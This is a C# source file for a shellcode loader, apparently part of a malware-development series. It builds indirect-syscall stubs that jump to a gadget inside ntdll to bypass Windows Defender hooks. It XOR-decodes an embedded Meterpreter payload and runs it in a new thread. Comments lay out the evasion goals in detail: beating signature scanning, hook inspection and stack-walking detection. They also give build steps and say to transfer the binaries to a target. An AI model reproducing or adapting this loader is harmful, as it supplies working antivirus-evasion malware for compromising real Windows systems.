// ============================================================================
// LOADER 03: Indirect Syscalls Shellcode Loader
// ============================================================================
//
// WHAT THIS DOES:
//   This loader executes shellcode in memory using indirect syscalls.
//   Instead of calling Windows API functions through ntdll.dll (where
//   Defender places its hooks), we build small stubs of machine code that
//   jump directly to the syscall instruction inside ntdll itself.
//
// WHY THE PREVIOUS VERSION WAS WRONG:
//   The old version used GetProcAddress to find ntdll functions, then called
//   them through Marshal.GetDelegateForFunctionPointer. That still enters
//   ntdll at the very start of the function, exactly where Defender places
//   its hook. The call went through the hook every time.
//
// HOW INDIRECT SYSCALLS WORK:
//   When Windows runs a syscall, the CPU instruction that triggers it is
//   literally two bytes: 0F 05. That instruction exists inside ntdll.dll
//   at the end of every NT function. Normally, an NT function runs like:
//
//     NtAllocateVirtualMemory:
//       4C 8B D1           mov r10, rcx       <- copy first argument
//       B8 18 00 00 00     mov eax, 0x18      <- SSN (syscall number)
//       0F 05              syscall            <- enter kernel
//       C3                 ret
//
//   Defender hooks the function by replacing the first few bytes with a
//   JMP instruction that redirects to Defender's inspection code. If we
//   call the function from the start, we hit the hook.
//
//   Indirect syscalls skip the function start entirely. We:
//   1. Read the syscall number (SSN) from the function bytes at offset +4
//   2. Find the address of a real "syscall; ret" (0F 05 C3) inside ntdll
//   3. Build our own stub that sets up registers then jumps to that gadget
//   4. Call our stub instead of calling ntdll's function from the start
//
//   The hook at the function prologue is never reached. The syscall still
//   happens inside ntdll (the return address on the stack points into ntdll),
//   so stack-walking detection also sees a legitimate call chain.
//
// STUB LAYOUT (22 bytes per function):
//   4C 8B D1              mov r10, rcx        Windows syscall convention
//   B8 XX XX 00 00        mov eax, SSN        put syscall number in eax
//   FF 25 00 00 00 00     jmp [rip+0]         indirect jump, reads next 8 bytes
//   XX XX XX XX XX XX XX XX  gadget address   address of "syscall; ret" in ntdll
//
// SHELLCODE HANDLING:
//   Shellcode is XOR-encoded with key 0xAB and embedded as a byte array.
//   The decode loop runs in C# before execution. The encoded bytes in the
//   binary do not match any Defender signature. The decode happens entirely
//   in memory and is never written to disk.
//
// REFERENCES:
//   - SysWhispers3: github.com/klezVirus/SysWhispers3
//   - Netero1010 CSharp indirect syscalls implementation
//   - RedOps: Malware Development - Direct vs Indirect Syscalls
//   - ired.team: Syscalls in Windows
//   - Document: 07_direct_syscalls.md
//
// BUILD INSTRUCTIONS:
//   On Dev Box (ammulu, 192.168.10.150) or any Windows machine with dotnet 8:
//     dotnet build loader.csproj -c Release -o output/
//   Transfer output/loader.dll and output/loader.exe to target.
//
// ============================================================================

using System;
using System.Runtime.InteropServices;

namespace IndirectSyscalls
{
    class Program
    {
        // ---- Bootstrap imports (not suspicious - every program uses these) ----
        // We need GetModuleHandle to find where ntdll.dll is loaded in memory.
        // We need GetProcAddress to read the bytes at each NT function's start
        // so we can extract the SSN. We do NOT call the NT functions through
        // these pointers - we only read bytes from the function addresses.
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);

        // VirtualAlloc is used only to allocate the stub memory (22 bytes * 4 stubs).
        // Allocating 88 bytes for code stubs is not suspicious. We do NOT use
        // VirtualAlloc for shellcode memory - that goes through indirect syscalls.
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);

        // ---- Delegate types for our four NT functions ----
        // These delegate types describe the function signatures. We point them at
        // our stubs (not at ntdll), so calling these delegates calls our stub,
        // which then jumps to the syscall gadget inside ntdll.

        // NtAllocateVirtualMemory: allocates memory in a process address space.
        // This is the NT-level equivalent of VirtualAlloc.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtAllocateVirtualMemory_t(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect
        );

        // NtProtectVirtualMemory: changes the memory protection on an existing block.
        // We use this to flip shellcode memory from read-write to execute-read
        // after writing the shellcode, avoiding a single RWX allocation.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtProtectVirtualMemory_t(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect
        );

        // NtCreateThreadEx: creates a thread at a given start address.
        // We point the start address at our shellcode.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtCreateThreadEx_t(
            out IntPtr ThreadHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr StartRoutine,
            IntPtr Argument,
            uint CreateFlags,
            IntPtr ZeroBits,
            IntPtr StackSize,
            IntPtr MaximumStackSize,
            IntPtr AttributeList
        );

        // NtWaitForSingleObject: waits until a thread finishes.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtWaitForSingleObject_t(
            IntPtr Handle,
            bool Alertable,
            IntPtr Timeout
        );

        // ---- Constants ----
        const uint MEM_COMMIT       = 0x1000;
        const uint MEM_RESERVE      = 0x2000;
        const uint PAGE_READWRITE   = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint THREAD_ALL_ACCESS = 0x1FFFFF;

        // Each stub is exactly 22 bytes:
        //   3 bytes: mov r10, rcx
        //   5 bytes: mov eax, SSN
        //   6 bytes: jmp [rip+0]
        //   8 bytes: gadget address
        const int STUB_SIZE  = 22;
        const int STUB_COUNT = 4;

        // Block of executable memory holding all stubs.
        static IntPtr stubBlock = IntPtr.Zero;

        // ---- Find the syscall gadget inside ntdll ----
        // We scan ntdll's memory from its base address looking for the three
        // bytes 0F 05 C3 (syscall; ret). ntdll has many syscall stubs, each
        // ending with these exact bytes. We grab the first one we find.
        // The address we return is what our stubs will jump to.
        static unsafe IntPtr FindSyscallGadget(IntPtr ntdllBase)
        {
            // Read the size of ntdll from its PE header.
            // The PE signature offset is stored at 0x3C in the DOS header.
            // From the PE header, SizeOfImage is at offset 0x50 in the
            // Optional Header, which starts at PE+0x18.
            int peOffset    = Marshal.ReadInt32(ntdllBase + 0x3C);
            int imageSize   = Marshal.ReadInt32(ntdllBase + peOffset + 0x50);

            byte* p = (byte*)ntdllBase;

            // Walk through ntdll byte by byte until we find 0F 05 C3.
            for (int i = 0; i < imageSize - 2; i++)
            {
                if (p[i] == 0x0F && p[i + 1] == 0x05 && p[i + 2] == 0xC3)
                    return (IntPtr)(p + i);
            }

            throw new Exception("Syscall gadget not found in ntdll");
        }

        // ---- Build one indirect syscall stub ----
        // For a given NT function name, we:
        //   1. Get the function's address in ntdll
        //   2. Read the SSN from bytes at offset +4 (after "4C 8B D1 B8")
        //   3. Write the 22-byte stub into our executable stub block
        //   4. Return the address of the stub so we can call it
        static IntPtr BuildStub(IntPtr ntdllBase, string funcName, IntPtr gadgetAddr, int index)
        {
            IntPtr funcAddr = GetProcAddress(ntdllBase, funcName);
            if (funcAddr == IntPtr.Zero)
                throw new Exception("Not found: " + funcName);

            // Read the SSN. An unhooked ntdll function looks like:
            //   offset 0: 4C 8B D1           mov r10, rcx
            //   offset 3: B8                  mov eax, (next 4 bytes)
            //   offset 4: XX XX 00 00         the SSN value
            // We read 4 bytes at offset 4. The SSN is always small (< 0x01FF
            // on all Windows versions), so the top two bytes are 00 00.
            uint ssn = (uint)Marshal.ReadInt32(funcAddr + 4);

            // Write the stub bytes into our executable block.
            byte[] stub = new byte[STUB_SIZE];

            // mov r10, rcx  (3 bytes)
            // Windows x64 syscall calling convention requires rcx to be
            // copied to r10 before the syscall instruction is executed.
            stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;

            // mov eax, SSN  (5 bytes: opcode B8 + 4-byte immediate)
            stub[3] = 0xB8;
            stub[4] = (byte)( ssn        & 0xFF);
            stub[5] = (byte)((ssn >>  8) & 0xFF);
            stub[6] = 0x00;
            stub[7] = 0x00;

            // jmp [rip+0]  (6 bytes: FF 25 + 4-byte offset of 0)
            // This reads the 8 bytes immediately after this instruction
            // (at rip+0 since the offset is 0) and jumps to that address.
            stub[8]  = 0xFF; stub[9]  = 0x25;
            stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;

            // 8-byte gadget address (the "syscall; ret" location inside ntdll)
            byte[] gadgetBytes = BitConverter.GetBytes(gadgetAddr.ToInt64());
            Array.Copy(gadgetBytes, 0, stub, 14, 8);

            // Copy stub bytes into the executable block at the right offset.
            IntPtr stubAddr = stubBlock + (index * STUB_SIZE);
            Marshal.Copy(stub, 0, stubAddr, STUB_SIZE);

            return stubAddr;
        }

        static void Main(string[] args)
        {
            // ---- XOR-encoded shellcode ----
            // Raw meterpreter inline shellcode XOR-encoded with key 0xAB.
            // The bytes below are scrambled - no string signatures visible.
            // At runtime, the decode loop below unscrambles them in memory.
            byte xorKey = 0xAB;
            byte[] sc = new byte[] { SHELLCODE_PLACEHOLDER };

            // Decode in place. The C# for loop compiles to .NET IL which
            // does not contain shellcode-like byte patterns. Defender's
            // static scanner sees only scrambled data and a loop instruction.
            for (int i = 0; i < sc.Length; i++)
                sc[i] ^= xorKey;

            Console.WriteLine("[+] Shellcode decoded: " + sc.Length + " bytes");

            // ---- Step 1: Find ntdll and locate the syscall gadget ----
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                throw new Exception("ntdll not found");

            IntPtr gadget;
            unsafe { gadget = FindSyscallGadget(ntdll); }
            Console.WriteLine("[+] Syscall gadget at: 0x" + gadget.ToString("X"));

            // ---- Step 2: Allocate executable memory for the stubs ----
            // 4 stubs at 22 bytes each = 88 bytes of executable memory.
            // We use standard VirtualAlloc only for this small stub block.
            // The shellcode itself will go through our indirect syscall path.
            stubBlock = VirtualAlloc(IntPtr.Zero, STUB_SIZE * STUB_COUNT,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (stubBlock == IntPtr.Zero)
                throw new Exception("Stub allocation failed");

            Console.WriteLine("[+] Stub block at: 0x" + stubBlock.ToString("X"));

            // ---- Step 3: Build stubs and get callable delegates ----
            // Each BuildStub call writes 22 bytes into the stub block and
            // returns the address of those bytes. We then create a delegate
            // pointing at that address - NOT at ntdll's function start.
            // So calling the delegate calls our stub, which jumps to the
            // syscall gadget inside ntdll, bypassing any hooks entirely.
            IntPtr allocAddr   = BuildStub(ntdll, "NtAllocateVirtualMemory", gadget, 0);
            IntPtr protAddr2   = BuildStub(ntdll, "NtProtectVirtualMemory",  gadget, 1);
            IntPtr threadAddr  = BuildStub(ntdll, "NtCreateThreadEx",         gadget, 2);
            IntPtr waitAddr    = BuildStub(ntdll, "NtWaitForSingleObject",    gadget, 3);

            var ntAlloc   = (NtAllocateVirtualMemory_t)Marshal.GetDelegateForFunctionPointer(allocAddr,  typeof(NtAllocateVirtualMemory_t));
            var ntProtect = (NtProtectVirtualMemory_t) Marshal.GetDelegateForFunctionPointer(protAddr2,  typeof(NtProtectVirtualMemory_t));
            var ntThread  = (NtCreateThreadEx_t)       Marshal.GetDelegateForFunctionPointer(threadAddr, typeof(NtCreateThreadEx_t));
            var ntWait    = (NtWaitForSingleObject_t)  Marshal.GetDelegateForFunctionPointer(waitAddr,   typeof(NtWaitForSingleObject_t));

            Console.WriteLine("[+] Stubs built. NT calls will go through indirect syscalls.");

            // ---- Step 4: Allocate shellcode memory as READ-WRITE ----
            // We do NOT allocate RWX (read-write-execute) in a single call.
            // Allocating RWX is a known indicator of malicious behavior.
            // We allocate RW first, write the shellcode, then change to RX.
            // This matches what legitimate code does and is less suspicious.
            IntPtr baseAddr    = IntPtr.Zero;
            IntPtr regionSize  = (IntPtr)sc.Length;
            IntPtr currentProc = (IntPtr)(-1);   // -1 = handle to current process

            int status = ntAlloc(currentProc, ref baseAddr, IntPtr.Zero, ref regionSize,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status != 0)
            {
                Console.WriteLine("[-] NtAllocateVirtualMemory failed: 0x" + status.ToString("X"));
                return;
            }
            Console.WriteLine("[+] Memory allocated at: 0x" + baseAddr.ToString("X"));

            // ---- Step 5: Write shellcode into the allocated memory ----
            Marshal.Copy(sc, 0, baseAddr, sc.Length);
            // Clear the managed byte array now that bytes are in unmanaged memory.
            Array.Clear(sc, 0, sc.Length);
            Console.WriteLine("[+] Shellcode written. Managed copy cleared.");

            // ---- Step 6: Flip memory protection to EXECUTE-READ ----
            // Now that shellcode is written, we change the protection from
            // PAGE_READWRITE to PAGE_EXECUTE_READ. This means the memory
            // can be executed but not written to. This is the same pattern
            // legitimate programs use for JIT-compiled code.
            IntPtr protBase = baseAddr;
            IntPtr protSize = regionSize;
            uint oldProt;

            status = ntProtect(currentProc, ref protBase, ref protSize, PAGE_EXECUTE_READ, out oldProt);
            if (status != 0)
            {
                Console.WriteLine("[-] NtProtectVirtualMemory failed: 0x" + status.ToString("X"));
                return;
            }
            Console.WriteLine("[+] Memory changed to EXECUTE_READ.");

            // ---- Step 7: Create a thread to execute the shellcode ----
            IntPtr threadHandle;
            status = ntThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero,
                              currentProc, baseAddr, IntPtr.Zero, 0,
                              IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                Console.WriteLine("[-] NtCreateThreadEx failed: 0x" + status.ToString("X"));
                return;
            }
            Console.WriteLine("[+] Thread created. Shellcode is running.");

            // ---- Step 8: Wait for the thread to finish ----
            ntWait(threadHandle, false, IntPtr.Zero);
        }
    }
}
